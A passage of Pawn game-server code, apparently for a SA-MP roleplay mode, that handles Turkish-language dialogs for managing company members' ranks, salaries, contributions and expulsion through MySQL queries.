					format(DiaYazi, 1024, "SELECT * FROM `oyuncular` WHERE `Sirket`='%d' ORDER BY `SirketRutbe` DESC LIMIT %d, 25", Sirket[playerid], SirketUyeSayfa[playerid] * 25);
					mysql_tquery(Connection, DiaYazi, "ShowSirketUyeList", "d", playerid);
		            return 1;
		        }

		        if(SirketRutbe[playerid] < 2)
		        {
		            SendClientMessage(playerid, -1, "{FF0000}Sadece þirket yetkilileri þirket üyelerini düzenleyebilirler!");
					format(DiaYazi, 1024, "SELECT * FROM `oyuncular` WHERE `Sirket`='%d' ORDER BY `SirketRutbe` DESC LIMIT %d, 25", Sirket[playerid], SirketUyeSayfa[playerid] * 25);
     				mysql_tquery(Connection, DiaYazi, "ShowSirketUyeList", "d", playerid);
		            return 1;
		        }

		        SecilenSirketUye[playerid] = listitem;

		        new Baslik[128];

		        format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		        format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}else{
		        ShowSirketHomeDialog(playerid);
		    }
		}

		case DialogSirketUyeYonet:
		{
		    if(response)
		    {
		        switch(listitem)
		        {
  		            case 0: // Son Giriþ
		            {
		        		new Baslik[128];

		        		format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        		format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		        		format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                        format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
						format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        		format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        		ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
		            }

		            case 1: // Þirkete Katkýsý
		            {
		                if(SirketRutbe[playerid] < 3)
		                {
		                    SendClientMessage(playerid, -1, "{FF0000}Sadece þirket patronu üyelerin katkýlarýný sýfýrlayabilir!");
		        			new Baslik[128];

		        			format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        			format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		       			 	format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                			format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
							format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        			format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        			ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
							return 1;
						}
		                ShowPlayerDialog(playerid, DialogSirketUyeYonetKatki, DIALOG_STYLE_MSGBOX, "{00CED1}Þirkete Katkýyý Sýfýrla", "{DDDDDD}Seçtiðiniz üyenin þirkete katkýsýný sýfýrlamak istiyor musunuz?", "Evet", "Hayýr");
		            }

		            case 2: // Üyeye Maaþ Ver
		            {
		                if(SirketRutbe[playerid] < 3)
		                {
		                    SendClientMessage(playerid, -1, "{FF0000}Sadece þirket patronu maaþ verebilir!");
		        			new Baslik[128];

		        			format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        			format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		       			 	format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                			format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
							format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        			format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        			ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
							return 1;
						}
		                format(DiaYazi, 1024, "{DDDDDD}Þirket kasasýndaki para: {00FF00}%d$\n \n{ADFF2F}%s{DDDDDD}'a ne kadar maaþ vermek istiyorsunuz?", Sirketler[ Sirket[playerid] ][SirketKasa], SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		                ShowPlayerDialog(playerid, DialogSirketUyeYonetMaas, DIALOG_STYLE_INPUT, "{00CED1}Üyeye Maaþ Ver", DiaYazi, "Ver", "Geri");
		            }

		            case 3: // Üye Rütbesi
		            {
		                if(SirketRutbe[playerid] < 3)
		                {
		                    SendClientMessage(playerid, -1, "{FF0000}Sadece þirket patronu üyelerin rütbelerini deðiþtirebilir!");
		        			new Baslik[128];

		        			format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        			format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		       			 	format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                			format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
							format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        			format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        			ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
							return 1;
						}

		                if(!strcmp(Sirketler[ Sirket[playerid] ][SirketSahip], SirketUyeListName[playerid][ SecilenSirketUye[playerid] ], true))
		                {
		                    SendClientMessage(playerid, -1, "{FF0000}Þirket sahibinin rütbesini deðiþtiremezsiniz!");
		        			new Baslik[128];

		        			format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        			format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		       			 	format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                			format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
							format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        			format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        			ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
							return 1;
						}

		                for(new i; i < sizeof(SirketRutbeName); i++)
		                {
		                    format(DiaYazi, 1024, "%s{DDDDDD}%s\n", DiaYazi, SirketRutbeName[i]);
		                }
		                ShowPlayerDialog(playerid, DialogSirketUyeYonetRutbe, DIALOG_STYLE_LIST, "{00CED1}Üye Rütbesini Deðiþtir", DiaYazi, "Deðiþtir", "Geri");
		            }

		            case 4: // Üyeyi Þirketten At
		            {
		                if(!strcmp(Sirketler[ Sirket[playerid] ][SirketSahip], SirketUyeListName[playerid][ SecilenSirketUye[playerid] ], true))
		                {
		                    SendClientMessage(playerid, -1, "{FF0000}Þirket sahibini atamazsýnýz!");
		        			new Baslik[128];

		        			format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        			format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		       			 	format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                			format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
							format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        			format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        			ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
							return 1;
						}

		                if(SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] >= SirketRutbe[playerid])
		                {
		                    SendClientMessage(playerid, -1, "{FF0000}Þirketteki yetkisi sizle ayný olan veya sizden yüksek olan birini atamazsýnýz!");
		        			new Baslik[128];

		        			format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		        			format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
		       			 	format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                			format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
							format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
		        			format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

		        			ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
							return 1;
						}
		                format(DiaYazi, 1024, "{FFCC00}» {FFFFFF}%s{DDDDDD}'yi þirketten atmak istiyor musunuz?", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
		                ShowPlayerDialog(playerid, DialogSirketUyeYonetAt, DIALOG_STYLE_MSGBOX, "{00CED1}Üyeyi Þirketten At", DiaYazi, "Evet", "Hayýr");
		            }
		        }
		    }else{
				SendClientMessage(playerid, -1, "{DDDDDD}Þirket üyelerinin listesi hazýrlanýyor...");

				format(DiaYazi, 1024, "SELECT * FROM `oyuncular` WHERE `Sirket`='%d' ORDER BY `SirketRutbe` DESC LIMIT %d, 25", Sirket[playerid], SirketUyeSayfa[playerid] * 25);
     			mysql_tquery(Connection, DiaYazi, "ShowSirketUyeList", "d", playerid);
		    }
		}

		case DialogSirketUyeYonetKatki:
		{
			if(response)
			{
			    SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ] = 0;
				new ID = GetPlayerID(SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
				if(ID == -1)
				{
  					format(DiaYazi, 1024, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'nin þirkete katkýsýný sýfýrladý.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
					foreach(new i:Player)
					{
			    		if(Sirket[i] == Sirket[playerid])
			    		{
			        		SendClientMessage(i, -1, DiaYazi);
			    		}
					}

  					format(DiaYazi, 1024, "UPDATE `oyuncular` SET `SirketKatki`='0' WHERE `Nick`='%s'", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
					mysql_query(Connection, DiaYazi);
				}else{
					format(DiaYazi, 1024, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'nin þirkete katkýsýný sýfýrladý.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
					foreach(new i:Player)
					{
			    		if(Sirket[i] == Sirket[playerid])
			    		{
			        		SendClientMessage(i, -1, DiaYazi);
			    		}
					}

					SirketKatki[ID] = 0;
					Oyuncu_Kaydet(ID);
				}

				new Baslik[128];

				format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
  				format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
    			format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
  				format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

				ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}else{
		        new Baslik[128];

				format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
  				format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
    			format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
  				format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

				ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}
		}

		case DialogSirketUyeYonetMaas:
		{
			if(response)
			{
			    if(!strlen(inputtext))
			    {
			        SendClientMessage(playerid, -1, "{FF0000}Maaþ miktarýný girmediniz!");
       				format(DiaYazi, 1024, "{DDDDDD}Þirket kasasýndaki para: {00FF00}%d$\n \n{ADFF2F}%s{DDDDDD}'a ne kadar maaþ vermek istiyorsunuz?", Sirketler[ Sirket[playerid] ][SirketKasa], SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
           			ShowPlayerDialog(playerid, DialogSirketUyeYonetMaas, DIALOG_STYLE_INPUT, "{00CED1}Üyeye Maaþ Ver", DiaYazi, "Ver", "Geri");
			        return 1;
			    }
			    new MaasMiktar = strval(inputtext);
				if(MaasMiktar < 0)
				{
				    SendClientMessage(playerid, -1, "{FF0000}Maaþ miktarý 0'dan küçük olamaz!");
    				format(DiaYazi, 1024, "{DDDDDD}Þirket kasasýndaki para: {00FF00}%d$\n \n{ADFF2F}%s{DDDDDD}'a ne kadar maaþ vermek istiyorsunuz?", Sirketler[ Sirket[playerid] ][SirketKasa], SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
        			ShowPlayerDialog(playerid, DialogSirketUyeYonetMaas, DIALOG_STYLE_INPUT, "{00CED1}Üyeye Maaþ Ver", DiaYazi, "Ver", "Geri");
				    return 1;
				}

				if(MaasMiktar > Sirketler[ Sirket[playerid] ][SirketKasa])
				{
				    SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu kadar para yok!");
    				format(DiaYazi, 1024, "{DDDDDD}Þirket kasasýndaki para: {00FF00}%d$\n \n{ADFF2F}%s{DDDDDD}'a ne kadar maaþ vermek istiyorsunuz?", Sirketler[ Sirket[playerid] ][SirketKasa], SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
        			ShowPlayerDialog(playerid, DialogSirketUyeYonetMaas, DIALOG_STYLE_INPUT, "{00CED1}Üyeye Maaþ Ver", DiaYazi, "Ver", "Geri");
				    return 1;
				}

			    SirketUyeListPara[playerid][ SecilenSirketUye[playerid] ] += MaasMiktar;
				new ID = GetPlayerID(SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
				if(ID == -1)
				{
  					format(DiaYazi, 1024, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'e {ADFF2F}%d$ {DDDDDD}maaþ verdi.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ], MaasMiktar);
					foreach(new i:Player)
					{
			    		if(Sirket[i] == Sirket[playerid])
			    		{
			        		SendClientMessage(i, -1, DiaYazi);
			    		}
					}

  					format(DiaYazi, 1024, "UPDATE `oyuncular` SET `Money`='%d' WHERE `Nick`='%s'", SirketUyeListPara[playerid][ SecilenSirketUye[playerid] ], SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
					mysql_query(Connection, DiaYazi);

					Sirketler[ Sirket[playerid] ][SirketKasa] -= MaasMiktar;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
				}else{
					format(DiaYazi, 1024, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'e {ADFF2F}%d$ {DDDDDD}maaþ verdi.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ], MaasMiktar);
					foreach(new i:Player)
					{
			    		if(Sirket[i] == Sirket[playerid])
			    		{
			        		SendClientMessage(i, -1, DiaYazi);
			    		}
					}

					RewardPlayer(ID, MaasMiktar, 0);
					Sirketler[ Sirket[playerid] ][SirketKasa] -= MaasMiktar;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
					Oyuncu_Kaydet(ID);
				}

				new Baslik[128];

				format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
  				format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
    			format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
  				format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

				ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}else{
		        new Baslik[128];

				format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
  				format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
    			format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
  				format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

				ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}
		}

		case DialogSirketUyeYonetRutbe:
		{
			if(response)
			{
			    SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] = listitem;
				new ID = GetPlayerID(SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
				if(ID == -1)
				{
  					format(DiaYazi, 2000, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'nin rütbesini {ADFF2F}%s {DDDDDD}yaptý.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ], SirketRutbeName[listitem]);
					foreach(new i:Player)
					{
			    		if(Sirket[i] == Sirket[playerid])
			    		{
			        		SendClientMessage(i, -1, DiaYazi);
			    		}
					}

  					format(DiaYazi, 1024, "UPDATE `oyuncular` SET `SirketRutbe`='%d' WHERE `Nick`='%s'", listitem, SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
					mysql_query(Connection, DiaYazi);
				}else{
				    if(ID != playerid)
				    {
  						format(DiaYazi, 1024, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'nin rütbesini {ADFF2F}%s {DDDDDD}yaptý.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ], SirketRutbeName[listitem]);
						foreach(new i:Player)
						{
			    			if(Sirket[i] == Sirket[playerid])
			    			{
			        			SendClientMessage(i, -1, DiaYazi);
			    			}
						}

						SirketRutbe[ID] = listitem;
						Oyuncu_Kaydet(ID);
					}else{
					    SendClientMessage(playerid, -1, "{FF0000}Kendi rütbenizi deðiþtiremezsiniz!");
					}
				}

                new Baslik[128];

				format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
  				format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
    			format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
  				format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

				ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}else{
		        new Baslik[128];

				format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
  				format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
    			format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
  				format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

				ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}
		}

		case DialogSirketUyeYonetAt:
		{
			if(response)
			{
				new ID = GetPlayerID(SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
				if(ID == -1)
				{
  					format(DiaYazi, 1024, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'yi þirketten çýkardý.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
					foreach(new i:Player)
					{
			    		if(Sirket[i] == Sirket[playerid])
			    		{
			        		SendClientMessage(i, -1, DiaYazi);
			    		}
					}

  					format(DiaYazi, 2000, "UPDATE `oyuncular` SET `Sirket`='-1', `SirketRutbe`='0', `SirketKatki`='0' WHERE `Nick`='%s'", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
					mysql_query(Connection, DiaYazi);
				}else{
				    if(ID != playerid)
				    {
  						format(DiaYazi, 1024, "{F8F8FF}Þirket sahibiniz {00FF00}%s, %s{DDDDDD}'yi þirketten çýkardý.", GetName(playerid), SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
						foreach(new i:Player)
						{
			    			if(Sirket[i] == Sirket[playerid])
			    			{
			        			SendClientMessage(i, -1, DiaYazi);
			    			}
						}
						Sirket[ID] = -1;
						SirketKatki[ID] = 0;
						SirketRutbe[ID] = 0;
						Oyuncu_Kaydet(ID);
					}else{
					    SendClientMessage(playerid, -1, "{FF0000}Kendinizi þirketten atamazsýnýz!");
					}
				}

                Sirketler[ Sirket[playerid] ][SirketUye]--;
                Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

				SendClientMessage(playerid, -1, "{DDDDDD}Þirket üyelerinin listesi hazýrlanýyor...");

				SirketUyeSayfa[playerid] = 0;
				format(DiaYazi, 1024, "SELECT * FROM `oyuncular` WHERE `Sirket`='%d' ORDER BY `SirketRutbe` DESC LIMIT %d, 25", Sirket[playerid], SirketUyeSayfa[playerid] * 25);
				mysql_tquery(Connection, DiaYazi, "ShowSirketUyeList", "d", playerid);
			}else{
		        new Baslik[128];

				format(Baslik, 128, "{DDDDDD}Üye {00CED1}%s", SirketUyeListName[playerid][ SecilenSirketUye[playerid] ]);
  				format(DiaYazi, 1024, "{DDDDDD}Son Giriþ\t{ADFF2F}%s\n", SirketUyeListSonGiris[playerid][ SecilenSirketUye[playerid] ]);
    			format(DiaYazi, 1024, "%s{DDDDDD}Þirkete Katkýsý\t{ADFF2F}%d$\n", DiaYazi, SirketUyeListKatki[playerid][ SecilenSirketUye[playerid] ]);
                format(DiaYazi, 1024, "%s{DDDDDD}Üyeye Maaþ Ver\t\n", DiaYazi);
				format(DiaYazi, 1024, "%s{DDDDDD}Üye Rütbesi\t{ADFF2F}%s\n", DiaYazi, SirketRutbeName[ SirketUyeListRutbe[playerid][ SecilenSirketUye[playerid] ] ]);
  				format(DiaYazi, 1024, "%s{DDDDDD}Üyeyi Þirketten At\n", DiaYazi);

				ShowPlayerDialog(playerid, DialogSirketUyeYonet, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
			}
		}
	}
	return 1;
}

// ShowSirketUyeList
forward ShowSirketUyeList(playerid);
public ShowSirketUyeList(playerid)
{
	new DiaYazi[2000], G, A, Y, ID, uSayi;
	format(DiaYazi, 2000, "%sNick\tSon Giriþ\tKatký\tYetki\n", DiaYazi);

    for(new i =0; i < cache_num_rows(); i++)
    {
		cache_get_value_name(i, "Nick", SirketUyeListName[playerid][i], 30);
        cache_get_value_name_int(i,"SonGun", G);
        cache_get_value_name_int(i,"SonAy", A);
        cache_get_value_name_int(i,"SonYil", Y);
		format(SirketUyeListSonGiris[playerid][i], 20, "%d.%d.%d", G, A, Y);
        cache_get_value_name_int(i,"SirketKatki", SirketUyeListKatki[playerid][i]);
        cache_get_value_name_int(i,"Money", SirketUyeListPara[playerid][i]);
        cache_get_value_name_int(i,"SirketRutbe", SirketUyeListRutbe[playerid][i]);

		ID = GetPlayerID(SirketUyeListName[playerid][i]);
		if(ID == -1)
		{
